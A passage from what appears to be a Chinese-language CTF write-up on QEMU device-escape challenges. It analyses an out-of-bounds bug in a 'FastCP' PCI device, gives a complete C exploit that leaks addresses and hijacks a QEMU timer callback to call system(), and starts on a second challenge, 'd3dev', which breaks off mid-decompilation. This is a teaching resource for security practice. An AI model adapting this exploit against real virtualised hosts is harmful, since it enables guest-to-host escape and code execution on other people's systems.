<code>opaque-&gt;cp_state.cmd = 2</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，通过<code>( cp_info.CP_cnt &lt;= 0x1000 )</code>验证之后再将<code>cp_info.CP_src</code>内容读取到<code>opaque-&gt;CP_buffer</code>上。</li><li>  <code>opaque-&gt;cp_state.cmd = 4</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，未通过任何验证，直接将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上</li><li>  <code>opaque-&gt;cp_state.cmd = 1</code>; 从<code>opaque-&gt;cp_state.CP_list_src + 8 * v9</code>读取内容到栈上，未通过任何验证，将<code>cp_info.CP_src</code>读取到<code>opaque-&gt;CP_buffer</code>上，再将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCPState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A30</span>, align=<span class="number">0x10</span>, copyof_4530)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000008F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009E0</span> cp_state CP_state ?</span><br><span class="line"><span class="number">000009F</span>8 handling db ?</span><br><span class="line"><span class="number">000009F</span>9 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>A db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>B db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>C irq_status dd ?</span><br><span class="line"><span class="number">00000</span>A00 CP_buffer db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001</span>A00 cp_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00001</span>A30 FastCPState ends</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="number">00000000</span> QEMUTimer_0 struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1181)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> expire_time dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list dq ?                         ; offset</span><br><span class="line"><span class="number">00000010</span> cb dq ?                                 ; offset</span><br><span class="line"><span class="number">00000018</span> opaque dq ?                             ; offset</span><br><span class="line"><span class="number">00000020</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000028</span> attributes dd ?</span><br><span class="line"><span class="number">0000002</span>C scale dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0 ends</span><br></pre></td></tr></table></figure><p>结合上述结构体再加上上面的分析结果漏洞已经呼之欲出了。因为情况2和3中没有对len进行验证导致可以越界使用结构体产生的漏洞。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>因为漏洞点较为简单，所以利用方式也比较简单</p><ol><li>  首先通过情况2越界读取到<code>cp_timer</code>成员中的内容。该成员中cb的值为<code>fastcp_cp_timer</code>函数的地址(在<code>pci_FastCP_realize</code>中完成赋值)，进而泄漏出system的地址。顺便泄漏出opaque成员地址。</li><li>  通过情况3越界写入内容到<code>cp_timer</code>成员，劫持cb和opaque。</li><li>  最后触发timer完成利用</li></ol><h4 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a><strong>注意！！</strong></h4><p><strong>虽然利用方式特别简单，但是这道题目有一点是非常容易被忽略的。那就是物理地址连续不代表虚拟地址连续！</strong></p><p>在下面exp中，在第一次读取到<code>cp_timer</code>成员到内容后并没有使用<code>*(unsigned long long *)(userbuf + 0x1010)</code>来读取，因为程序中实际写入到函数是<code>cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);</code>而这里写入到的是物理地址，但是物理地址并不连续，所以这里是读取不到的。所以最后往<code>cp_timer</code>成员写入的时候使用的也是<code>va2pa(userbuf + 0x1000) - 0x1000</code>写入。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> CP_src;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_cnt;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> expire_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> timer_list;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cb;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x50</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_cnt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x10</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_src</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + <span class="number">8</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> src, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write_CP_list_cnt(cnt);</span><br><span class="line">    write_CP_list_src(src);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = cmd;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x2000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span> <span class="title">info</span>;</span></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = phy_userbuf + <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">2</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fastcp_cp_timer=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x1000</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x2000</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fastcp_cp_timer = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> elf_base = fastcp_cp_timer - <span class="number">0x4DCE80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = elf_base + <span class="number">0x2C2180</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> opaque_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line">    timer.expire_time = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    timer.timer_list = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x8</span>);</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.opaque = opaque_addr + <span class="number">0x1a30</span>;</span><br><span class="line">    timer.next = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x20</span>);</span><br><span class="line">    timer.attributes = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x28</span>);</span><br><span class="line">    timer.scale = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x2c</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;timer.command, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf + <span class="number">0x1000</span>, &amp;timer, <span class="keyword">sizeof</span>(timer));</span><br><span class="line"></span><br><span class="line">    info.CP_src = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span> + <span class="number">9</span>;</span><br><span class="line">    info.CP_dst = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(userbuf + i * <span class="number">0x18</span>, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_cmd(<span class="number">1</span>, phy_userbuf, <span class="number">0x11</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321155543134.png"                      alt="image-20230321155543134"                ></p><h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>先看看结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">d3devState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">uint32_t</span> memory_mode;</span><br><span class="line">  <span class="keyword">uint32_t</span> seek;</span><br><span class="line">  <span class="keyword">uint32_t</span> init_flag;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_read_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_write_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> r_seed;</span><br><span class="line">  <span class="keyword">uint64_t</span> blocks[<span class="number">257</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + (result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mmio_read</code>函数这里，首先是根据seek和addr定位到数据，随后将数据进行tea解密，然后第一次输出低32位，第二次输出高32位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span 